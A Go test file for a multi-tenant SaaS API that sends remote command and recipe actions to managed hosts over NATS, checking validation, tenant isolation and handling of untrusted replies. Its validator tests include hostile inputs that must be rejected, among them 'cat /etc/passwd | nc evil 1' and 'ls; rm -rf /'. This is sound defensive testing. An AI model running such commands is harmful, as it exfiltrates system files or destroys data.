package saasapi

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/nats-io/nats-server/v2/server"
	"github.com/nats-io/nats.go"
	"gorm.io/gorm"

	apitypes "github.com/yogzblr/imas/internal/api/types"
	"github.com/yogzblr/imas/internal/controlplane"
)

// fakeFarmer stands in for farmer's internal.sprout.action handler: it
// records every request and answers with whatever respond returns (a nil
// return means "don't reply").
type fakeFarmer struct {
	mu       sync.Mutex
	requests []controlplane.SproutActionRequest
	replies  []string // reply subjects, to check the inbox prefix
	ids      []string // each request's sealed message ID
}

func (f *fakeFarmer) seen() ([]controlplane.SproutActionRequest, []string) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]controlplane.SproutActionRequest(nil), f.requests...), append([]string(nil), f.replies...)
}

func startTestBus(t *testing.T) *server.Server {
	t.Helper()
	ns, err := server.NewServer(&server.Options{Host: "127.0.0.1", Port: -1})
	if err != nil {
		t.Fatalf("starting NATS: %v", err)
	}
	go ns.Start()
	t.Cleanup(ns.Shutdown)
	if !ns.ReadyForConnections(5 * time.Second) {
		t.Fatal("NATS not ready")
	}
	return ns
}

// connectSaaSBus dials ns the way ConnectBus does (with the SaaS API inbox
// prefix) and installs it as the package bus.
func connectSaaSBus(t *testing.T, ns *server.Server) *nats.Conn {
	t.Helper()
	nc, err := nats.Connect(ns.ClientURL(), nats.CustomInboxPrefix(controlplane.SaaSAPIInboxPrefix))
	if err != nil {
		t.Fatalf("connect: %v", err)
	}
	t.Cleanup(nc.Close)
	SetBus(nc)
	t.Cleanup(func() { SetBus(nil) })
	return nc
}

func startFakeFarmer(t *testing.T, ns *server.Server, respond func(controlplane.SproutActionRequest) any) *fakeFarmer {
	t.Helper()
	f := &fakeFarmer{}
	fnc, err := nats.Connect(ns.ClientURL())
	if err != nil {
		t.Fatalf("farmer connect: %v", err)
	}
	t.Cleanup(fnc.Close)
	_, err = fnc.Subscribe(controlplane.SubjectSproutAction, func(msg *nats.Msg) {
		// Opened as farmer opens it: sealed by the SaaS API, bound to
		// this subject.
		var req controlplane.SproutActionRequest
		sealed, err := farmerOpenRequest(msg, &req)
		if err != nil {
			t.Errorf("fake farmer: request didn't open: %v", err)
			return
		}
		f.mu.Lock()
		f.requests = append(f.requests, req)
		f.replies = append(f.replies, msg.Reply)
		f.ids = append(f.ids, sealed.ID)
		f.mu.Unlock()
		switch out := respond(req).(type) {
		case nil:
		case []byte:
			// Raw bytes, unsealed: a reply that isn't farmer's.
			_ = msg.Respond(out)
		default:
			_ = farmerRespond(msg, sealed.ID, out)
		}
	})
	if err != nil {
		t.Fatalf("farmer subscribe: %v", err)
	}
	_ = fnc.Flush()
	return f
}

func mustCreateActiveTenant(t *testing.T, gdb *gorm.DB) string {
	t.Helper()
	tid, _ := newID("t_")
	if err := gdb.Create(&Tenant{ID: tid, Name: "Acme", Status: TenantStatusActive}).Error; err != nil {
		t.Fatalf("creating tenant: %v", err)
	}
	return tid
}

func postActions(t *testing.T, tenantID string, body any) (int, map[string]any) {
	t.Helper()
	w := doRequest(t, CreateSproutActionBatch, "POST", "/v1/tenants/"+tenantID+"/sprouts/actions",
		map[string]string{"tenant_id": tenantID}, body)
	var resp map[string]any
	_ = json.Unmarshal(w.Body.Bytes(), &resp)
	return w.Code, resp
}

func getBatch(t *testing.T, tenantID, batchID string) (int, actionBatchResponse) {
	t.Helper()
	w := doRequest(t, GetSproutActionBatch, "GET", "/v1/tenants/"+tenantID+"/sprouts/actions/"+batchID,
		map[string]string{"tenant_id": tenantID, "batch_id": batchID}, nil)
	var resp actionBatchResponse
	_ = json.Unmarshal(w.Body.Bytes(), &resp)
	return w.Code, resp
}

func itemsByAsset(resp actionBatchResponse) map[string]actionItemResponse {
	m := make(map[string]actionItemResponse, len(resp.Items))
	for _, it := range resp.Items {
		m[it.AssetID] = it
	}
	return m
}

func cmdAction(cmd string) map[string]any {
	return map[string]any{"type": "cmd.run", "params": map[string]any{"cmd": cmd}}
}

// TestFarmerActionParamsContract pins farmerCmdRun/farmerCook's JSON
// against the types farmer's internal.sprout.action handler decodes them
// into, so a field rename there breaks this test instead of silently
// dropping a param.
func TestFarmerActionParamsContract(t *testing.T) {
	in := farmerCmdRun{Command: "systemctl", Args: []string{"restart", "nginx"}, CWD: "/tmp", RunAs: "www",
		Timeout: 42 * time.Second}
	b, _ := json.Marshal(in)
	var got apitypes.CmdRun
	if err := json.Unmarshal(b, &got); err != nil {
		t.Fatalf("decoding into apitypes.CmdRun: %v", err)
	}
	if got.Command != in.Command || strings.Join(got.Args, " ") != "restart nginx" || got.CWD != in.CWD ||
		got.RunAs != in.RunAs || len(got.Env) != 0 || got.Timeout != in.Timeout {
		t.Fatalf("apitypes.CmdRun = %+v, from %s", got, b)
	}

	cin := farmerCook{Recipe: "nginx.harden", Test: true}
	b, _ = json.Marshal(cin)
	var cook apitypes.CmdCook
	if err := json.Unmarshal(b, &cook); err != nil {
		t.Fatalf("decoding into apitypes.CmdCook: %v", err)
	}
	if string(cook.Recipe) != cin.Recipe || cook.Env != "" || !cook.Test {
		t.Fatalf("apitypes.CmdCook = %+v, from %s", cook, b)
	}
}

func TestTranslateCmdRun(t *testing.T) {
	out, msg := translateCmdRun(cmdRunInput{Cmd: "  systemctl restart   nginx "})
	if msg != "" || out.Command != "systemctl" || strings.Join(out.Args, "|") != "restart|nginx" || out.Timeout != defaultCmdTimeout {
		t.Fatalf("split form: %+v, %q", out, msg)
	}
	out, msg = translateCmdRun(cmdRunInput{Cmd: "/opt/my tool", Args: []string{"a b", "$HOME"}, TimeoutSeconds: 30})
	if msg != "" || out.Command != "/opt/my tool" || len(out.Args) != 2 || out.Args[1] != "$HOME" || out.Timeout != 30*time.Second {
		t.Fatalf("args form: %+v, %q", out, msg)
	}
	for name, in := range map[string]cmdRunInput{
		"empty":    {Cmd: "  "},
		"quotes":   {Cmd: `echo "hi there"`},
		"pipe":     {Cmd: "cat /etc/passwd | nc evil 1"},
		"subst":    {Cmd: "echo $(id)"},
		"nul":      {Cmd: "ls\x00"},
		"negative": {Cmd: "ls", TimeoutSeconds: -1},
		"too long": {Cmd: "ls", TimeoutSeconds: 601},
		"huge cmd": {Cmd: strings.Repeat("a", maxCmdLen+1)},
	} {
		if _, msg := translateCmdRun(in); msg == "" {
			t.Errorf("%s: accepted %+v", name, in)
		}
	}
}

func TestDispatchReplyTimeout(t *testing.T) {
	params, _ := json.Marshal(farmerCmdRun{Command: "ls", Timeout: 2 * time.Minute})
	if got, want := dispatchReplyTimeout(controlplane.ActionCmdRun, string(params)), 2*time.Minute+farmerSproutWait+dispatchReplyMargin; got != want {
		t.Fatalf("cmd.run: %s, want %s", got, want)
	}
	if got, want := dispatchReplyTimeout(controlplane.ActionCmdRun, "not json"), maxCmdTimeout+farmerSproutWait+dispatchReplyMargin; got != want {
		t.Fatalf("unreadable cmd.run params: %s, want the maximum %s", got, want)
	}
	if got, want := dispatchReplyTimeout(controlplane.ActionCook, `{"recipe":"x"}`), farmerSproutWait+dispatchReplyMargin; got != want {
		t.Fatalf("cook: %s, want %s", got, want)
	}
}

func TestCreateSproutActionBatch_Validation(t *testing.T) {
	gdb := newTestDBWithFarmer(t)
	tid := mustCreateActiveTenant(t, gdb)

	tooMany := make([]string, maxAssetIDsPerLookup+1)
	for i := range tooMany {
		tooMany[i] = "a"
	}
	cases := []struct {
		name     string
		body     any
		wantCode string
	}{
		{"too many asset ids", map[string]any{"asset_ids": tooMany, "action": cmdAction("ls")}, "too_many_asset_ids"},
		{"no asset ids", map[string]any{"asset_ids": []string{}, "action": cmdAction("ls")}, "invalid_request"},
		{"empty asset id", map[string]any{"asset_ids": []string{"a1", " "}, "action": cmdAction("ls")}, "invalid_request"},
		{"long asset id", map[string]any{"asset_ids": []string{strings.Repeat("a", maxAssetIDLen+1)}, "action": cmdAction("ls")}, "invalid_request"},
		{"unknown top-level field", map[string]any{"asset_ids": []string{"a1"}, "action": cmdAction("ls"), "tenant_id": "t_other"}, "invalid_request"},
		{"sprout ids are not accepted", map[string]any{"asset_ids": []string{"a1"}, "sprout_ids": []string{"web-01"}, "action": cmdAction("ls")}, "invalid_request"},
		{"missing action type", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"params": map[string]any{"cmd": "ls"}}}, "invalid_request"},
		{"self_update not exposed", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "self_update", "params": map[string]any{}}}, "unsupported_action"},
		{"unknown action type", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "shell.start", "params": map[string]any{}}}, "unsupported_action"},
		{"cmd.run without params", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cmd.run"}}, "invalid_request"},
		{"cmd.run stream_topic smuggled", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cmd.run", "params": map[string]any{"cmd": "ls", "stream_topic": "imas.x"}}}, "invalid_request"},
		{"cmd.run farmer-shaped params", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cmd.run", "params": map[string]any{"command": "ls"}}}, "invalid_request"},
		{"cmd.run shell syntax", map[string]any{"asset_ids": []string{"a1"}, "action": cmdAction("ls; rm -rf /")}, "invalid_request"},
		{"cmd.run env not accepted", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cmd.run", "params": map[string]any{"cmd": "ls", "env": map[string]string{"TOKEN": "s3cret"}}}}, "invalid_request"},
		{"cook env not accepted", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cook", "params": map[string]any{"recipe": "x", "env": "prod"}}}, "invalid_request"},
		{"cook without recipe", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cook", "params": map[string]any{"test": true}}}, "invalid_request"},
		{"cook token smuggled", map[string]any{"asset_ids": []string{"a1"}, "action": map[string]any{"type": "cook", "params": map[string]any{"recipe": "x", "token": "t"}}}, "invalid_request"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			code, resp := postActions(t, tid, tc.body)
			if code != 400 || resp["error"] != tc.wantCode {
				t.Fatalf("got %d %v, want 400 %s", code, resp, tc.wantCode)
			}
		})
	}

	var n int64
	gdb.Model(&AssetActionBatch{}).Where("tenant_id = ?", tid).Count(&n)
	if n != 0 {
		t.Fatalf("%d batches written for rejected requests", n)
	}
}

func TestCreateSproutActionBatch_TenantMustExistAndBeActive(t *testing.T) {
	gdb := newTestDBWithFarmer(t)
	body := map[string]any{"asset_ids": []string{"a1"}, "action": cmdAction("ls")}

	if code, resp := postActions(t, "t_missing", body); code != 404 || resp["error"] != "tenant_not_found" {
		t.Fatalf("missing tenant: %d %v", code, resp)
	}
	for _, status := range []TenantStatus{TenantStatusPending, TenantStatusFailed, TenantStatusOffboarding, TenantStatusOffboarded} {
		tid, _ := newID("t_")
		gdb.Create(&Tenant{ID: tid, Name: "x", Status: status})
		if code, resp := postActions(t, tid, body); code != 409 || resp["error"] != "tenant_not_active" {
			t.Fatalf("%s tenant: %d %v", status, code, resp)
		}
	}
}

// The main path: resolution, the item rows it writes, dispatch over the
// bus, and every kind of cmd.run reply landing in GET's per-item status.
func TestSproutActionBatch_CmdRunEndToEnd(t *testing.T) {
	gdb := newTestDBWithFarmer(t)
	ns := startTestBus(t)
	connectSaaSBus(t, ns)

	tid := mustCreateActiveTenant(t, gdb)
	other := mustCreateActiveTenant(t, gdb)
	// Same sprout_id in both tenants: sprout_id is only unique per tenant.
	mustInsertFarmerSprout(t, gdb, tid, "web-01", "accepted")
	mustInsertFarmerSprout(t, gdb, tid, "web-02", "accepted")
	mustInsertFarmerSprout(t, gdb, tid, "web-03", "accepted")
	mustInsertFarmerSprout(t, gdb, tid, "new-01", "unaccepted")
	mustInsertFarmerSprout(t, gdb, other, "web-01", "accepted")
	mustLinkAsset(t, tid, "web-01", "a-ok")
	mustLinkAsset(t, tid, "web-02", "a-exit3")
	mustLinkAsset(t, tid, "web-03", "a-unreach")
	mustLinkAsset(t, tid, "new-01", "a-unaccepted")
	mustLinkAsset(t, other, "web-01", "a-other-tenant")

	farmer := startFakeFarmer(t, ns, func(req controlplane.SproutActionRequest) any {
		reply := controlplane.SproutActionReply{TenantID: req.TenantID, SproutID: req.SproutID}
		switch req.SproutID {
		case "web-01":
			reply.Status = controlplane.StatusCompleted
			reply.Result = &controlplane.CmdRunResult{Stdout: "ok", ExitCode: 0}
		case "web-02":
			reply.Status = controlplane.StatusCompleted
			reply.Result = &controlplane.CmdRunResult{Stderr: "secret detail", ExitCode: 3}
		default:
			reply.Status = controlplane.StatusFailed
			reply.ErrorCode = controlplane.ErrorSproutUnreachable
		}
		return reply
	})

	code, resp := postActions(t, tid, map[string]any{
		"asset_ids": []string{"a-ok", "a-exit3", "a-unreach", "a-unaccepted", "a-never", "a-other-tenant", "a-ok"},
		"action":    map[string]any{"type": "cmd.run", "params": map[string]any{"cmd": "systemctl restart nginx", "timeout_seconds": 5}},
	})
	if code != 202 {
		t.Fatalf("POST: %d %v", code, resp)
	}
	batchID, _ := resp["batch_id"].(string)
	if !strings.HasPrefix(batchID, actionBatchIDPrefix) || len(resp) != 1 {
		t.Fatalf("POST response = %v", resp)
	}
	actionDispatches.Wait()

	reqs, replies := farmer.seen()
	if len(reqs) != 3 {
		t.Fatalf("farmer got %d requests, want 3 (accepted, resolved sprouts only): %+v", len(reqs), reqs)
	}
	for i, req := range reqs {
		if req.TenantID != tid {
			t.Errorf("request %d asserted tenant %q, want %q", i, req.TenantID, tid)
		}
		var p apitypes.CmdRun
		if err := json.Unmarshal(req.Action.Params, &p); err != nil || req.Action.Type != "cmd.run" ||
			p.Command != "systemctl" || strings.Join(p.Args, " ") != "restart nginx" || p.Timeout != 5*time.Second {
			t.Errorf("request %d action = %s %s (%v)", i, req.Action.Type, req.Action.Params, err)
		}
		if !controlplane.ValidSaaSAPIReplySubject(replies[i]) {
			t.Errorf("request %d reply subject %q is outside the SaaS API inbox", i, replies[i])
		}
	}

	code, got := getBatch(t, tid, batchID)
	if code != 200 || got.BatchID != batchID || got.Status != actionBatchCompleted || got.ActionType != "cmd.run" {
		t.Fatalf("GET: %d %+v", code, got)
	}
	if len(got.Items) != 6 {
		t.Fatalf("GET items = %+v, want 6 (deduplicated)", got.Items)
	}
	wantOrder := []string{"a-ok", "a-exit3", "a-unreach", "a-unaccepted", "a-never", "a-other-tenant"}
	for i, it := range got.Items {
		if it.AssetID != wantOrder[i] {
			t.Fatalf("items out of request order: %+v", got.Items)
		}
	}
	items := itemsByAsset(got)
	check := func(asset string, status AssetActionItemStatus, sprout, errCode string, exit *int) {
		t.Helper()
		it := items[asset]
		if it.Status != status || it.SproutID != sprout || it.Error != errCode {
			t.Errorf("%s = %+v, want status %s sprout %q error %q", asset, it, status, sprout, errCode)
		}
		if (exit == nil) != (it.ExitCode == nil) || (exit != nil && *exit != *it.ExitCode) {
			t.Errorf("%s exit code = %v, want %v", asset, it.ExitCode, exit)
		}
		if errCode != "" && it.Message != actionErrorMessage(errCode) {
			t.Errorf("%s message = %q", asset, it.Message)
		}
	}
	zero, three := 0, 3
	check("a-ok", ActionItemSucceeded, "web-01", "", &zero)
	check("a-exit3", ActionItemFailed, "web-02", errCodeCommandFailed, &three)
	check("a-unreach", ActionItemFailed, "web-03", string(controlplane.ErrorSproutUnreachable), nil)
	check("a-unaccepted", ActionItemFailed, "new-01", errCodeSproutNotAccepted, nil)
	check("a-never", ActionItemUnresolved, "", "", nil)
	// Another tenant's asset is exactly as unresolved as one never linked.
	check("a-other-tenant", ActionItemUnresolved, "", "", nil)
	a, _ := json.Marshal(items["a-never"])
	b, _ := json.Marshal(items["a-other-tenant"])
	if strings.Replace(string(a), "a-never", "X", 1) != strings.Replace(string(b), "a-other-tenant", "X", 1) {
		t.Errorf("unresolved items differ: %s vs %s", a, b)
	}
	if body, _ := json.Marshal(got); strings.Contains(string(body), "secret detail") || strings.Contains(string(body), "systemctl") {
		t.Errorf("GET leaks command output or params: %s", body)
	}

	// The other tenant can't see this batch, and gets the same 404 as for
	// a batch that doesn't exist.
	codeOther, _ := getBatch(t, other, batchID)
	wOther := doRequest(t, GetSproutActionBatch, "GET", "/", map[string]string{"tenant_id": other, "batch_id": batchID}, nil)
	wMissing := doRequest(t, GetSproutActionBatch, "GET", "/", map[string]string{"tenant_id": other, "batch_id": "b_doesnotexist"}, nil)
	if codeOther != 404 || wOther.Body.String() != wMissing.Body.String() {
		t.Fatalf("cross-tenant GET: %d %s vs missing %s", codeOther, wOther.Body.String(), wMissing.Body.String())
	}

	// Every stored item carries the tenant, and attempts were counted.
	var rows []AssetActionItem
	gdb.Where("batch_id = ?", batchID).Find(&rows)
	for _, r := range rows {
		if r.TenantID != tid {
			t.Errorf("item %s stored tenant %q", r.AssetID, r.TenantID)
		}
		wantAttempts := 0
		if r.SproutID != "" && r.ErrorCode != errCodeSproutNotAccepted {
			wantAttempts = 1
		}
		if r.Attempts != wantAttempts {
			t.Errorf("item %s attempts = %d, want %d", r.AssetID, r.Attempts, wantAttempts)
		}
	}
}

type fakeJobReader struct {
	mu       sync.Mutex
	tenants  []string
	outcomes map[JobRef]JobOutcome
	err      error
}

func (f *fakeJobReader) JobOutcomes(_ context.Context, tenantID string, jobs []JobRef) (map[JobRef]JobOutcome, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.tenants = append(f.tenants, tenantID)
	if f.err != nil {
		return nil, f.err
	}
	out := make(map[JobRef]JobOutcome)
	for _, j := range jobs {
		if o, ok := f.outcomes[j]; ok {
			out[j] = o
		}
	}
	return out, nil
}

func TestSproutActionBatch_CookRunningThenRefreshedFromJobs(t *testing.T) {
	gdb := newTestDBWithFarmer(t)
	ns := startTestBus(t)
	connectSaaSBus(t, ns)

	tid := mustCreateActiveTenant(t, gdb)
	mustInsertFarmerSprout(t, gdb, tid, "web-01", "accepted")
	mustInsertFarmerSprout(t, gdb, tid, "web-02", "accepted")
	mustLinkAsset(t, tid, "web-01", "c1")
	mustLinkAsset(t, tid, "web-02", "c2")

	jids := map[string]string{"web-01": "11111111-1111-1111-1111-111111111111", "web-02": "22222222-2222-2222-2222-222222222222"}
	farmer := startFakeFarmer(t, ns, func(req controlplane.SproutActionRequest) any {
		return controlplane.SproutActionReply{TenantID: req.TenantID, SproutID: req.SproutID,
			Status: controlplane.StatusDispatched, JID: jids[req.SproutID]}
	})

	code, resp := postActions(t, tid, map[string]any{
		"asset_ids": []string{"c1", "c2"},
		"action":    map[string]any{"type": "cook", "params": map[string]any{"recipe": "nginx.harden"}},
	})
	if code != 202 {
		t.Fatalf("POST: %d %v", code, resp)
	}
	batchID := resp["batch_id"].(string)
	actionDispatches.Wait()
	reqs, _ := farmer.seen()
	if len(reqs) != 2 || string(reqs[0].Action.Params) != `{"recipe":"nginx.harden"}` {
		t.Fatalf("farmer requests = %+v", reqs)
	}

	// The default reader (farmer.job_status) with no index rows yet:
	// running, with the jid.
	_, got := getBatch(t, tid, batchID)
	if got.Status != actionBatchInProgress {
		t.Fatalf("batch status = %s, want in_progress", got.Status)
	}
	for _, it := range got.Items {
		if it.Status != ActionItemRunning || it.JID != jids[it.SproutID] {
			t.Fatalf("item = %+v, want running with its jid", it)
		}
	}

	// A reader error degrades to the stored state.
	reader := &fakeJobReader{err: errors.New("database down")}
	SetJobStatusReader(reader)
	t.Cleanup(func() { SetJobStatusReader(farmerJobStatusReader{}) })
	if code, got := getBatch(t, tid, batchID); code != 200 || got.Status != actionBatchInProgress {
		t.Fatalf("GET with failing reader: %d %+v", code, got)
	}
	for _, rt := range reader.tenants {
		if rt != tid {
			t.Fatalf("reader asked about tenant %q, want %q", rt, tid)
		}
	}
	SetJobStatusReader(farmerJobStatusReader{})

	// Another tenant's index row for the same sprout_id and jid is not
	// this tenant's job, and a still-running job stays running.
	other := mustCreateActiveTenant(t, gdb)
	mustInsertFarmerJobStatus(t, gdb, other, "web-01", jids["web-01"], "succeeded")
	mustInsertFarmerJobStatus(t, gdb, tid, "web-02", jids["web-02"], "running")
	if _, got := getBatch(t, tid, batchID); got.Status != actionBatchInProgress {
		t.Fatalf("after other tenant's / running rows: %+v", got)
	}

	// One job finished, one failed.
	mustInsertFarmerJobStatus(t, gdb, tid, "web-01", jids["web-01"], "succeeded")
	mustInsertFarmerJobStatus(t, gdb, tid, "web-02", jids["web-02"], "failed")
	_, got = getBatch(t, tid, batchID)
	items := itemsByAsset(got)
	if got.Status != actionBatchCompleted || items["c1"].Status != ActionItemSucceeded ||
		items["c2"].Status != ActionItemFailed || items["c2"].Error != errCodeJobFailed || items["c2"].JID == "" {
		t.Fatalf("after refresh: %+v", got)
	}

	// Recorded: a later GET doesn't need the reader.
	SetJobStatusReader(nil)
	_, got = getBatch(t, tid, batchID)
	if items := itemsByAsset(got); items["c1"].Status != ActionItemSucceeded || items["c2"].Status != ActionItemFailed {
		t.Fatalf("refresh not persisted: %+v", got)
	}
}

// Replies that can't be trusted, and requests nobody answers, never land
// as a success — and never as re-sendable if farmer may have acted.
func TestSproutActionBatch_UntrustworthyOrMissingReplies(t *testing.T) {
	gdb := newTestDBWithFarmer(t)
	ns := startTestBus(t)
	connectSaaSBus(t, ns)
	replyTimeoutFor = func(string, string) time.Duration { return 300 * time.Millisecond }
	t.Cleanup(func() { replyTimeoutFor = dispatchReplyTimeout })

	tid := mustCreateActiveTenant(t, gdb)
	other := mustCreateActiveTenant(t, gdb)
	for _, s := range []string{"garbage", "wrong-tenant", "wrong-sprout", "silent", "jidless", "unknown-code"} {
		mustInsertFarmerSprout(t, gdb, tid, s, "accepted")
		mustLinkAsset(t, tid, s, "asset-"+s)
	}
	startFakeFarmer(t, ns, func(req controlplane.SproutActionRequest) any {
		ok := controlplane.SproutActionReply{TenantID: req.TenantID, SproutID: req.SproutID,
			Status: controlplane.StatusCompleted, Result: &controlplane.CmdRunResult{}}
		switch req.SproutID {
		case "garbage":
			return []byte("{not json")
		case "wrong-tenant":
			ok.TenantID = other
			return ok
		case "wrong-sprout":
			ok.SproutID = "garbage"
			return ok
		case "silent":
			return nil
		case "jidless":
			// A cook-style reply to a cmd.run.
			return controlplane.SproutActionReply{TenantID: req.TenantID, SproutID: req.SproutID, Status: controlplane.StatusDispatched}
		default:
			return controlplane.SproutActionReply{TenantID: req.TenantID, SproutID: req.SproutID,
				Status: controlplane.StatusFailed, ErrorCode: "disk full at /var/lib/secret"}
		}
	})

	_, resp := postActions(t, tid, map[string]any{
		"asset_ids": []string{"asset-garbage", "asset-wrong-tenant", "asset-wrong-sprout", "asset-silent", "asset-jidless", "asset-unknown-code"},
		"action":    cmdAction("ls"),
	})
	actionDispatches.Wait()
	_, got := getBatch(t, tid, resp["batch_id"].(string))
	want := map[string]string{
		"asset-garbage":      errCodeDispatchOutcomeUnknown,
		"asset-wrong-tenant": errCodeDispatchOutcomeUnknown,
		"asset-wrong-sprout": errCodeDispatchOutcomeUnknown,
		"asset-silent":       errCodeDispatchOutcomeUnknown,
		"asset-jidless":      string(controlplane.ErrorInternal),
		"asset-unknown-code": string(controlplane.ErrorInternal),
	}
	for asset, it := range itemsByAsset(got) {
		if it.Status != ActionItemFailed || it.Error != want[asset] {
			t.Errorf("%s = %+v, want failed %s", asset, it, want[asset])
		}
	}
	if body, _ := json.Marshal(got); strings.Contains(string(body), "disk full") {
		t.Errorf("farmer's error text leaked: %s", body)
	}
}

func TestSproutActionBatch_NoFarmerOrNoBusLeavesItemsQueued(t *testing.T) {
	gdb := newTestDBWithFarmer(t)
	tid := mustCreateActiveTenant(t, gdb)
	mustInsertFarmerSprout(t, gdb, tid, "web-01", "accepted")
	mustLinkAsset(t, tid, "web-01", "q1")
	body := map[string]any{"asset_ids": []string{"q1"}, "action": cmdAction("ls")}

	attemptsOf := func(batchID string) (AssetActionItemStatus, int) {
		var it AssetActionItem
		gdb.Where("batch_id = ?", batchID).First(&it)
		return it.Status, it.Attempts
	}

	// No bus at all: nothing sent, nothing counted.
	SetBus(nil)
	code, resp := postActions(t, tid, body)
	actionDispatches.Wait()
	if code != 202 {
		t.Fatalf("POST without bus: %d %v", code, resp)
	}
	if st, n := attemptsOf(resp["batch_id"].(string)); st != ActionItemQueued || n != 0 {
		t.Fatalf("without bus: %s/%d, want queued/0", st, n)
	}

	// A bus with no farmer subscribed: provably not delivered, so back
	// to queued (re-sendable), with the attempt counted.
	ns := startTestBus(t)
	connectSaaSBus(t, ns)
	_, resp = postActions(t, tid, body)
	actionDispatches.Wait()
	batchID := resp["batch_id"].(string)
	if st, n := attemptsOf(batchID); st != ActionItemQueued || n != 1 {
		t.Fatalf("no responders: %s/%d, want queued/1", st, n)
	}
	if _, got := getBatch(t, tid, batchID); got.Status != actionBatchInProgress {
		t.Fatalf("batch with a queued item = %s, want in_progress", got.Status)
	}
}

// dispatchItem only sends an item it can claim from queued, so a batch
// dispatched twice (or an item a future sweeper also picks up) runs once.
func TestDispatchItem_OnlySendsQueuedItems(t *testing.T) {
	gdb := newTestDBWithFarmer(t)
	ns := startTestBus(t)
	nc := connectSaaSBus(t, ns)
	farmer := startFakeFarmer(t, ns, func(req controlplane.SproutActionRequest) any {
		return controlplane.SproutActionReply{TenantID: req.TenantID, SproutID: req.SproutID,
			Status: controlplane.StatusCompleted, Result: &controlplane.CmdRunResult{}}
	})

	tid := mustCreateActiveTenant(t, gdb)
	mustInsertFarmerSprout(t, gdb, tid, "web-01", "accepted")
	mustLinkAsset(t, tid, "web-01", "d1")
	action, _ := json.Marshal(farmerCmdRun{Command: "ls", Timeout: time.Second})
	rows, _ := resolveAssetIDs(tid, []string{"d1"})
	batch, queued, err := createActionBatch(tid, []string{"d1"}, controlplane.SproutAction{Type: "cmd.run", Params: action}, rows)
	if err != nil || len(queued) != 1 {
		t.Fatalf("createActionBatch: %v, %d queued", err, len(queued))
	}
	dispatchBatch(gdb, nc, batch, queued, nil)
	dispatchBatch(gdb, nc, batch, queued, nil)
	if reqs, _ := farmer.seen(); len(reqs) != 1 {
		t.Fatalf("farmer got %d requests, want 1", len(reqs))
	}
}

func TestGetSproutActionBatch_NotFound(t *testing.T) {
	gdb := newTestDBWithFarmer(t)
	tid := mustCreateActiveTenant(t, gdb)
	for _, id := range []string{"b_nope", strings.Repeat("b", maxActionBatchIDLen+1)} {
		if code, _ := getBatch(t, tid, id); code != 404 {
			t.Fatalf("GET %q: %d, want 404", id, code)
		}
	}
	if code, _ := getBatch(t, "t_missing", "b_nope"); code != 404 {
		t.Fatalf("GET for a missing tenant: %d, want 404", code)
	}
}
